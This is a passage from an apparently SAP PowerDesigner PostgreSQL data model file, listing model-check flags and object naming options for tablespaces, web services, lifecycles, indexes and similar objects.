Variable\\CheckUndefDttp]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Type][FolderOptions\\CheckModel\\Database Package.Database Package Type\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Type\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Type\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Type\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Type\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Type\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Type\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Type\\UniqueDefinition]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Exception][FolderOptions\\CheckModel\\Database Package.Database Package Exception\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Exception\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Exception\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Exception\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Exception\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Exception\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Exception\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Tablespace][FolderOptions\\CheckModel\\Tablespace\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Tablespace\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Tablespace\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Tablespace\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Tablespace\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Tablespace\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Tablespace\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Tablespace\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Tablespace\\IsObjectUsed]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Tablespace\\PGSQL9_Tablespace_Mandatory_Tablespace_Location]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Storage][FolderOptions\\CheckModel\\Storage\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Storage\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Storage\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Storage\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Storage\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Storage\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Storage\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Storage\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Storage\\IsObjectUsed]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database][FolderOptions\\CheckModel\\Database\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database\\IsObjectUsed]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Web Service][FolderOptions\\CheckModel\\Web Service\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Web Service\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Web Service\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Web Service\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Web Service\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Web Service\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Web Service\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Web Service\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Web Service.Web Operation][FolderOptions\\CheckModel\\Web Service.Web Operation\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Web Service.Web Operation\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Web Service.Web Operation\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Web Service.Web Operation\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Web Service.Web Operation\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Web Service.Web Operation\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Web Service.Web Operation\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Web Service.Web Operation\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle][FolderOptions\\CheckModel\\Lifecycle\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle\\CheckLifecyclePhase]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle\\CheckLifecycleRetention]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle\\CheckPartitionRange]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle.Phase][FolderOptions\\CheckModel\\Lifecycle.Phase\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle.Phase\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle.Phase\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle.Phase\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle.Phase\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle.Phase\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle.Phase\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle.Phase\\CheckPhaseTbspace]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle.Phase\\CheckPhaseIQTbspace]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle.Phase\\CheckPhaseDuplicateTbspace]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle.Phase\\CheckPhaseTbspaceCurrency]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle.Phase\\CheckPhaseRetention]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle.Phase\\CheckPhaseIdlePeriod]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle.Phase\\CheckPhaseDataSource]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Lifecycle.Phase\\CheckPhaseExternalOnFirst]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Replication][FolderOptions\\CheckModel\\Replication\\PartialReplication]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule][FolderOptions\\CheckModel\\Business Rule\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\EmptyColl - OBJCOL]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object][FolderOptions\\CheckModel\\Extended Object\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link][FolderOptions\\CheckModel\\Extended Link\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File][FolderOptions\\CheckModel\\File\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\CheckPathExists]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format][FolderOptions\\CheckModel\\Data Format\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\CheckDataFormatNullExpression]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index.Index Column][FolderOptions\\CheckModel\\Table.Index.Index Column\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index.Index Column\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index.Index Column\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index.Index Column\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index.Index Column\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index.Index Column\\PGSQL9_IndexColumn_Index_expression_enclosed_in_parenthesis]CheckSeverity=NoFixRequested=YesCheckRequested=Yes[FolderOptions\\CheckModel\\View.View Index.Index Column][FolderOptions\\CheckModel\\View.View Index.Index Column\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View.View Index.Index Column\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View.View Index.Index Column\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View.View Index.Index Column\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View.View Index.Index Column\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View.View Index.Index Column\\PGSQL9_IndexColumn_Index_expression_enclosed_in_parenthesis]CheckSeverity=NoFixRequested=YesCheckRequested=Yes&lt;/a:PackageOptionsText&gt;&lt;a:ModelOptionsText&gt;[ModelOptions][ModelOptions\\Physical Objects]CaseSensitive=NoDisplayName=YesEnableTrans=NoUseTerm=NoEnableRequirements=NoEnableFullShortcut=YesSynchroCode=YesDefaultDttp=IgnoreOwner=NoRebuildTrigger=YesRefrUnique=YesRefrAutoMigrate=YesRefrMigrateReuse=YesRefrMigrateDomain=YesRefrMigrateCheck=YesRefrMigrateRule=YesRefrMigrateExtd=NoRefrMigrDefaultLink=NoRefrDfltImpl=DRefrPrgtColn=NoRefrMigrateToEnd=NoRebuildTriggerDep=NoColnFKName=%.3:PARENT%_%COLUMN%ColnFKNameUse=NoDomnCopyDttp=YesDomnCopyChck=NoDomnCopyRule=NoDomnCopyMand=NoDomnCopyExtd=NoDomnCopyProf=NoNotation=0DomnDefaultMandatory=NoColnDefaultMandatory=NoTablDefaultOwner=ViewDefaultOwner=TrgrDefaultOwnerTabl=TrgrDefaultOwnerView=IdxDefaultOwnerTabl=IdxDefaultOwnerView=JdxDefaultOwner=DBPackDefaultOwner=SeqDefaultOwner=ProcDefaultOwner=DBMSTrgrDefaultOwner=Currency=USDRefrDeleteConstraint=1RefrUpdateConstraint=1RefrParentMandatory=NoRefrParentChangeAllow=YesRefrCheckOnCommit=No[ModelOptions\\Physical Objects\\NamingOptionsTemplates][ModelOptions\\Physical Objects\\ClssNamingOptions][ModelOptions\\Physical Objects\\ClssNamingOptions\\PDMPCKG][ModelOptions\\Physical Objects\\ClssNamingOptions\\PDMPCKG\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\PDMPCKG\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\PDMDOMN][ModelOptions\\Physical Objects\\ClssNamingOptions\\PDMDOMN\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\PDMDOMN\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\TABL][ModelOptions\\Physical Objects\\ClssNamingOptions\\TABL\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\TABL\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\COLN][ModelOptions\\Physical Objects\\ClssNamingOptions\\COLN\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\COLN\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\INDX][ModelOptions\\Physical Objects\\ClssNamingOptions\\INDX\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\INDX\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\REFR][ModelOptions\\Physical Objects\\ClssNamingOptions\\REFR\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\REFR\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\VREF][ModelOptions\\Physical Objects\\ClssNamingOptions\\VREF\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\VREF\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\VIEW][ModelOptions\\Physical Objects\\ClssNamingOptions\\VIEW\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\VIEW\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\VIEWC][ModelOptions\\Physical Objects\\ClssNamingOptions\\VIEWC\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\VIEWC\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\WEBSERV][ModelOptions\\Physical Objects\\ClssNamingOptions\\WEBSERV\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\WEBSERV\\Code]Template=MaxLen=254Case=MValidChar=&amp;#39;a&amp;#39;-&amp;#39;z&amp;#39;,&amp;#39;A&amp;#39;-&amp;#39;Z&amp;#39;,&amp;#39;0&amp;#39;-&amp;#39;9&amp;#39;,&amp;quot;/-_.!~*&amp;#39;()&amp;quot;InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\WEBOP][ModelOptions\\Physical Objects\\ClssNamingOptions\\WEBOP\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\WEBOP\\Code]Template=MaxLen=254Case=MValidChar=&amp;#39;a&amp;#39;-&amp;#39;z&amp;#39;,&amp;#39;A&amp;#39;-&amp;#39;Z&amp;#39;,&amp;#39;0&amp;#39;-&amp;#39;9&amp;#39;,&amp;quot;/-_.!~*&amp;#39;()&amp;quot;InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\WPARAM][ModelOptions\\Physical Objects\\ClssNamingOptions\\WPARAM\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\WPARAM\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\FACT][ModelOptions\\Physical Objects\\ClssNamingOptions\\FACT\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\FACT\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\DIMN][ModelOptions\\Physical Objects\\ClssNamingOptions\\DIMN\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\DIMN\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\MEAS][ModelOptions\\Physical Objects\\ClssNamingOptions\\MEAS\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\MEAS\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\DATTR][ModelOptions\\Physical Objects\\ClssNamingOptions\\DATTR\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\DATTR\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\FILO][ModelOptions\\Physical Objects\\ClssNamingOptions\\FILO\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\FILO\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\FRMEOBJ][ModelOptions\\Physical Objects\\ClssNamingOptions\\FRMEOBJ\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical 